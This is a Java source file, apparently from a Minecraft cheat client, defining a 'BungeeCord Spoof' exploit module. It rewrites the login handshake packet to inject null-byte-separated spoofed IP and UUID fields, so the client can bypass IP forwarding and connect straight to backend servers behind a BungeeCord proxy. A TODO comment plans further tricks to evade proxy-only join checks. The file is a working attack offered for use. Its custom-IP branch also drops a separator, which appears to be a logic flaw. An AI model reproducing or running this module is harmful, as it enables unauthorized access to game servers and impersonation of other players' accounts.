package me.nekosarekawaii.foxglove.feature.impl.module.impl.exploit;

import de.florianmichael.dietrichevents2.DietrichEvents2;
import me.nekosarekawaii.foxglove.event.PacketListener;
import me.nekosarekawaii.foxglove.feature.FeatureCategory;
import me.nekosarekawaii.foxglove.feature.impl.module.Module;
import me.nekosarekawaii.foxglove.feature.impl.module.ModuleInfo;
import me.nekosarekawaii.foxglove.value.Value;
import me.nekosarekawaii.foxglove.value.values.BooleanValue;
import me.nekosarekawaii.foxglove.value.values.StringValue;
import net.minecraft.network.NetworkState;
import net.minecraft.network.packet.c2s.handshake.HandshakeC2SPacket;

import java.util.concurrent.ThreadLocalRandom;

@ModuleInfo(name = "BungeeCord Spoof", description = "Allows you to bypass ip forwarding on a bungeecord proxy.", category = FeatureCategory.EXPLOIT)
public class BungeeCordSpoofModule extends Module implements PacketListener {

    private final Value<Boolean> customizeIP = new BooleanValue("Customize IP", "Allows you to define the ip by your-self.", this, false);

    private final Value<String> ip = new StringValue("IP", "The IP that will used.", this, "127.0.0.1").visibleConsumer(this.customizeIP::getValue);

    @Override
    protected void onEnable() {
        DietrichEvents2.global().subscribe(PacketEvent.ID, this);
    }

    @Override
    protected void onDisable() {
        DietrichEvents2.global().unsubscribe(PacketEvent.ID, this);
    }

    private String getRandomIpPart() {
        return String.valueOf(ThreadLocalRandom.current().nextInt(256));
    }

    //TODO: Add magic characters to the address to bypass only proxy join. (have a look at the bungeecord source code)
    @Override
    public void onWrite(final PacketEvent event) {
        if (event.isCancelled()) return;
        if (event.packet instanceof final HandshakeC2SPacket handshakeC2SPacket) {
            if (handshakeC2SPacket.getIntendedState() == NetworkState.LOGIN) {
                handshakeC2SPacket.address += "\u0000";
                if (this.customizeIP.getValue()) {
                    handshakeC2SPacket.address = this.ip.getValue();
                } else {
                    handshakeC2SPacket.address +=
                            this.getRandomIpPart() + "." +
                                    this.getRandomIpPart() + "." +
                                    this.getRandomIpPart() + "." +
                                    this.getRandomIpPart();
                }
                handshakeC2SPacket.address += "\u0000" + mc.session.getUuid().replace("-", "");
            }
        }
    }

}
